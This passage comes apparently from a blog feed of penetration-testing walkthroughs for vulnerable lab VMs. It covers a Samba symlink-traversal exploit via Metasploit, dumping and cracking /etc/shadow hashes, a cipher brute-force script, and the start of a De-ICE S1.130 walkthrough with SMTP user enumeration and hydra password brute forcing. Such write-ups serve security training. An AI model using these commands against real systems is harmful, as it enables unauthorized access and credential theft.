</span><span class='line'>        tmp             Disk      Temporary file space
</span><span class='line'>        IPC$            IPC       IPC Service (Samba server by Rattus labs)
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
</span><span class='line'>
</span><span class='line'>        Server               Comment
</span><span class='line'>        ---------            -------
</span><span class='line'>        LOOPHOLE             Samba server by Rattus labs
</span><span class='line'>
</span><span class='line'>        Workgroup            Master
</span><span class='line'>        ---------            -------
</span><span class='line'>        WORKGROUP            LOOPHOLE
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali32:~# smbclient //10.8.7.2/tmp
</span><span class='line'>Enter root's password:
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
</span><span class='line'>smb: \> dir
</span><span class='line'>  .                                   D        0  Fri May 15 10:56:12 2015
</span><span class='line'>  ..                                  D        0  Fri May 15 12:55:54 2015
</span><span class='line'>  session_mm_apache0.sem              N        0  Fri May 15 10:56:12 2015
</span><span class='line'>  .X11-unix                          DH        0  Fri May 15 10:56:00 2015
</span><span class='line'>  .ICE-unix                          DH        0  Fri May 15 10:56:00 2015
</span><span class='line'>
</span><span class='line'>                37571 blocks of size 4096. 0 blocks available</span></code></pre></td></tr></table></div></figure>


<p>The /tmp directory is writable. We can use samba_symlink_traversal exploit in
Metasploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(samba_symlink_traversal) > show options 
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/smb/samba_symlink_traversal):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   RHOST      10.8.7.2         yes       The target address
</span><span class='line'>   RPORT      445              yes       Set the SMB service port
</span><span class='line'>   SMBSHARE   tmp              yes       The name of a writeable share on the server
</span><span class='line'>   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem
</span><span class='line'>
</span><span class='line'>msf auxiliary(samba_symlink_traversal) > exploit 
</span><span class='line'>
</span><span class='line'>[*] Connecting to the server...
</span><span class='line'>[*] Trying to mount writeable share 'tmp'...
</span><span class='line'>[*] Trying to link 'rootfs' to the root filesystem...
</span><span class='line'>[*] Now access the following share to browse the root filesystem:
</span><span class='line'>[*]     \\10.8.7.2\tmp\rootfs\
</span><span class='line'>
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbclient //10.8.7.2/tmp
</span><span class='line'>Enter root's password: 
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
</span><span class='line'>smb: \> dir
</span><span class='line'>  .                                   D        0  Fri May 15 12:23:06 2015
</span><span class='line'>  ..                                  D        0  Fri May 15 14:06:14 2015
</span><span class='line'>  rootfs                              D        0  Fri May 15 14:06:14 2015
</span><span class='line'>  session_mm_apache0.sem              N        0  Fri May 15 12:06:32 2015
</span><span class='line'>  .X11-unix                          DH        0  Fri May 15 12:06:20 2015
</span><span class='line'>  .ICE-unix                          DH        0  Fri May 15 12:06:20 2015
</span><span class='line'>
</span><span class='line'>                37571 blocks of size 4096. 36565 blocks available
</span><span class='line'>smb: \> cd rootfs
</span><span class='line'>smb: \rootfs\> dir
</span><span class='line'>  .                                   D        0  Fri May 15 14:06:14 2015
</span><span class='line'>  ..                                  D        0  Fri May 15 14:06:14 2015
</span><span class='line'>  root                                D        0  Fri May 15 12:06:42 2015
</span><span class='line'>  var                                 D        0  Thu Sep 28 23:17:18 2006
</span><span class='line'>  tmp                                 D        0  Fri May 15 12:23:06 2015
</span><span class='line'>  dev                                 D        0  Fri May 15 12:06:32 2015
</span><span class='line'>  sys                                 D        0  Fri May 15 14:06:07 2015
</span><span class='line'>  proc                               DR        0  Fri May 15 14:06:07 2015
</span><span class='line'>  boot                                D        0  Mon Feb 21 12:29:26 2011
</span><span class='line'>  mnt                                 D        0  Fri May 15 14:06:14 2015
</span><span class='line'>  etc                                 D        0  Fri May 15 12:06:24 2015
</span><span class='line'>  usr                                 D        0  Fri Feb 18 09:10:16 2011
</span><span class='line'>  srv                                 D        0  Sun Apr  8 01:30:06 2007
</span><span class='line'>  sbin                                D        0  Mon Feb 14 11:35:48 2011
</span><span class='line'>  opt                                 D        0  Sun Jun 10 08:23:35 2007
</span><span class='line'>  lib                                 D        0  Fri Feb 18 08:39:02 2011
</span><span class='line'>  home                                D        0  Mon Feb 14 12:00:31 2011
</span><span class='line'>  bin                                 D        0  Mon Apr 30 06:35:12 2007
</span><span class='line'>
</span><span class='line'>                37571 blocks of size 4096. 36565 blocks available
</span><span class='line'>smb: \rootfs\> cd var\www\htdocs
</span><span class='line'>smb: \rootfs\var\www\htdocs\> dir
</span><span class='line'>  .                                   D        0  Fri Feb 18 12:41:43 2011
</span><span class='line'>  ..                                  D        0  Tue Mar 20 10:58:04 2001
</span><span class='line'>  Images                              D        0  Fri Feb 18 12:22:50 2011
</span><span class='line'>  garbage                             N      288  Fri Feb 18 12:41:14 2011
</span><span class='line'>  index.html                          A     3001  Fri Feb 18 12:33:59 2011
</span><span class='line'>  info.php                            A       21  Fri Feb 18 12:06:04 2011
</span><span class='line'>  status.html                         A     2456  Fri Feb 18 12:28:46 2011
</span><span class='line'>
</span><span class='line'>                37571 blocks of size 4096. 36561 blocks available</span></code></pre></td></tr></table></div></figure>


<p>We suppose we should find &lsquo;garbage&rsquo; file this way, but the filename was too
predictable for dirb.</p>

<p>We log in as root / albatros and crack the last user (jsummer):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$  id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
</span><span class='line'>[root@loophole]$ cat /etc/shadow
</span><span class='line'>root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
</span><span class='line'>bin:!!:9797:0:::::
</span><span class='line'>daemon:!!:9797:0:::::
</span><span class='line'>adm:!!:9797:0:::::
</span><span class='line'>lp:!!:9797:0:::::
</span><span class='line'>sync:!!:9797:0:::::
</span><span class='line'>shutdown:!!:9797:0:::::
</span><span class='line'>halt:!!:9797:0:::::
</span><span class='line'>mail:!!:9797:0:::::
</span><span class='line'>news:!!:9797:0:::::
</span><span class='line'>uucp:!!:9797:0:::::
</span><span class='line'>operator:!!:9797:0:::::
</span><span class='line'>games:!!:9797:0:::::
</span><span class='line'>ftp:!!:9797:0:::::
</span><span class='line'>smmsp:!!:9797:0:::::
</span><span class='line'>mysql:!!:9797:0:::::
</span><span class='line'>rpc:!!:9797:0:::::
</span><span class='line'>sshd:!!:9797:0:::::
</span><span class='line'>gdm:!!:9797:0:::::
</span><span class='line'>apache:!!:9797:0:::::
</span><span class='line'>messagebus:!!:9797:0:::::
</span><span class='line'>haldaemon:!!:9797:0:::::
</span><span class='line'>pop:!!:9797:0:::::
</span><span class='line'>nobody:!!:9797:0:::::
</span><span class='line'>mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
</span><span class='line'>tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
</span><span class='line'>jsummer:$1$28n0w2tK$YaVxVAO87McqIfRJsp6jF0:15021:0:::::0
</span><span class='line'>
</span><span class='line'>tarot            (jsummer)</span></code></pre></td></tr></table></div></figure>


<p>Finally, we find and decrypt the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$ find /home/ -iname Private.doc.enc
</span><span class='line'>/home/tskies/Private.doc.enc</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:/tmp# cat crack-openssl.sh
</span><span class='line'><span class="c">#!/usr/bin/env bash</span>
</span><span class='line'>
</span><span class='line'><span class="nv">file</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'><span class="nv">key</span><span class="o">=</span><span class="nv">$2</span>
</span><span class='line'>
</span><span class='line'>rm -rf csv <span class="p">;</span> mkdir csv
</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span><span class="sb">`</span>openssl list-cipher-commands<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  openssl enc -d -<span class="s2">&quot;$c&quot;</span> -in <span class="nv">$file</span> -k <span class="s2">&quot;$key&quot;</span> -out csv/<span class="nv">$file</span>-<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
</span><span class='line'><span class="k">done</span>
</span><span class='line'>strings -n <span class="m">15</span> csv/*
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./crack-openssl.sh Private.doc.enc nostradamus
</span><span class='line'>Microsoft Office Word
</span><span class='line'>HEP ODS Elektrolika
</span><span class='line'>Microsoft Office Word Document
</span><span class='line'>Word.Document.8
</span><span class='line'>^O%-|bCoB4Pa%"8x
</span><span class='line'>s#dr2j;jS3zA@+[~k
</span><span class='line'>.\7{9y;~515s11Y
</span><span class='line'>0"/DLI*{tPmkfd|KJgX
</span><span class='line'>/yNM#7n%Q`4A--I
</span><span class='line'>f,^F-7H3(?p"v/,
</span><span class='line'>f,^F-7H3(?p"v/,
</span><span class='line'>IYgr_D)zQp>3R_  i</span></code></pre></td></tr></table></div></figure>


<p>The file that we are looking for has the name &lsquo;csv/Private.doc.enc-aes-256-cbc-decrypted&rsquo;.</p>

<p>There is even an easier way to decrypt the file, looking to tskier&rsquo;s home directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$  cat tskies/.bash_history 
</span><span class='line'>openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
</span><span class='line'>startx
</span><span class='line'>nano .bash_history 
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.130]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130/"/>
    <updated>2015-05-14T15:34:52+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1130,11/">De-ICE: S1.130</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
</span><span class='line'>20/tcp  closed ftp-data
</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
</span><span class='line'>443/tcp closed https
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>


<p>Dirb output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.1.20/ ----
</span><span class='line'>+ http://192.168.1.20/cgi-bin/ (CODE:403|SIZE:296)
</span><span class='line'>+ http://192.168.1.20/index.php (CODE:200|SIZE:1980)
</span><span class='line'>+ http://192.168.1.20/index2.php (CODE:200|SIZE:563)
</span><span class='line'>+ http://192.168.1.20/info.php (CODE:200|SIZE:37915)
</span><span class='line'>+ http://192.168.1.20/~sysadmin (CODE:403|SIZE:416)</span></code></pre></td></tr></table></div></figure>


<p>There is nothing interesting for us except the sysadmin account.</p>

<p>Web page mentions <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x63;&#x75;&#x73;&#x74;&#x6f;&#109;&#x65;&#x72;&#x73;&#101;&#114;&#118;&#x69;&#x63;&#x65;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x6e;&#111;&#115;&#x65;&#x63;&#x62;&#97;&#110;&#107;&#x2e;&#99;&#111;&#x6d;">&#x63;&#x75;&#x73;&#116;&#x6f;&#x6d;&#101;&#x72;&#x73;&#101;&#x72;&#118;&#105;&#99;&#x65;&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#110;&#111;&#x73;&#101;&#x63;&#98;&#97;&#x6e;&#107;&#x2e;&#99;&#x6f;&#109;</a> email address. After a
little trying, we found out the user account that exists:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smtp-user-enum -M RCPT -t 192.168.1.20 -f root@slax.example.net -U -
</span><span class='line'>csadmin
</span><span class='line'>[CTRL+D]
</span><span class='line'>
</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
</span><span class='line'>
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>|                   Scan Information                       |
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>
</span><span class='line'>Mode ..................... RCPT
</span><span class='line'>Worker Processes ......... 5
</span><span class='line'>Usernames file ........... -
</span><span class='line'>Target count ............. 1
</span><span class='line'>Username count ........... 1
</span><span class='line'>Target TCP port .......... 25
</span><span class='line'>Query timeout ............ 5 secs
</span><span class='line'>Target domain ............
</span><span class='line'>
</span><span class='line'>######## Scan started at Thu May  7 13:50:31 2015 #########
</span><span class='line'>192.168.1.20: csadmin exists
</span><span class='line'>######## Scan completed at Thu May  7 13:50:31 2015 #########
</span><span class='line'>1 results.
</span><span class='line'>
</span><span class='line'>1 queries in 2 seconds (0.5 queries / sec)</span></code></pre></td></tr></table></div></figure>


<p>We use hydra to crack user account successfully (ftp was the fastest way):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ftp -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: csadmin   password: rocker
</span><span class='line'>
</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 imap -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[143][imap] host: 192.168.1.20   login: csadmin   password: rocker
</span><span class='line'>
</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ssh -P /usr/share/ncrack/top50000.pwd -V -t 4
</span><span class='line'>[22][ssh] host: 192.168.1.20   login: csadmin   password: rocker
</span><span class='line'>
</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 pop3 -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[110][pop3] host: 192.168.1.20   login: csadmin   password: rocker</span></code></pre></td></tr></table></div></figure>


<p>We log in as csadmin / rocker:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat /etc/passwd
</span><span class='line'>root:x:0:0::/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:
</span><span class='line'>daemon:x:2:2:daemon:/sbin:
</span><span class='line'>adm:x:3:4:adm:/var/log:
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/:
</span><span class='line'>news:x:9:13:news:/usr/lib/news:
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
</span><span class='line'>games:x:12:100:games:/usr/games:
</span><span class='line'>ftp:x:14:50::/home/ftp:
</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
</span><span class='line'>sshd:x:33:33:sshd:/:
</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
</span><span class='line'>pop:x:90:90:POP:/:
</span><span class='line'>nobody:x:99:99:nobody:/:
</span><span class='line'>sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
</span><span class='line'>dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
</span><span class='line'>sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
</span><span class='line'>csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>In home directory, there is a clue how to get sdadmin&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat mailserv_download/2010122014234.j12Gqo4H049241 
</span><span class='line'>To: csadmin@nosecbank.com
</span><span class='line'>CC: 
</span><span class='line'>Subject: My Son's Birthday
</span><span class='line'>Date: Mon, 20 Dec 2010 14:23:46 +0500
</span><span class='line'>Return-Path: &lt;sdadmin@nosecbank.com>
</span><span class='line'>Delivered-To: csadmin:nosecbank.com@nosecbank.com
</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com; 
</span><span class='line'>20 Dec 2010 09:23:46 -0000
</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.34]) by 
</span><span class='line'>srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for 
</span><span class='line'>&lt;csadmin@nosecbank.com>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
</span><span class='line'>Message-Id: &lt;2010122014234.j12Gqo4H049241@www.nosecbank.com>
</span><span class='line'>Mime-Version: 1.0
</span><span class='line'>Content-Type: multipart/alternative; 
</span><span class='line'>boundary="---=_NextPart_000_0000_02F24S11.FEPQRE80"
</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
</span><span class='line'>Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
</span><span class='line'>Message: Hey Mark, I am curious if you would be free to come over and 
</span><span class='line'>visit for my son Donovin's birthday tomorrow after work.  I would also 
</span><span class='line'>appreciate if you brought Andy with you as well, because Donny 
</span><span class='line'>really enjoyed playing with him last time he was over.  I know its short 
</span><span class='line'>notice but he is turning 12 and it is special for both him and me. Let 
</span><span class='line'>me know if this works. Thanks!  -Paul</span></code></pre></td></tr></table></div></figure>


<p>Also there is a secord part of some algorithm:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">csadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part2</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">backLoop</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
</span><span class='line'><span class="mi">25</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>   <span class="n">w</span>
</span><span class='line'><span class="mi">26</span>      <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="mi">27</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="mi">28</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">29</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">%</span><span class="n">check</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'><span class="mi">30</span>      <span class="k">else</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);}</span>        <span class="p">.</span>
</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopProcess</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
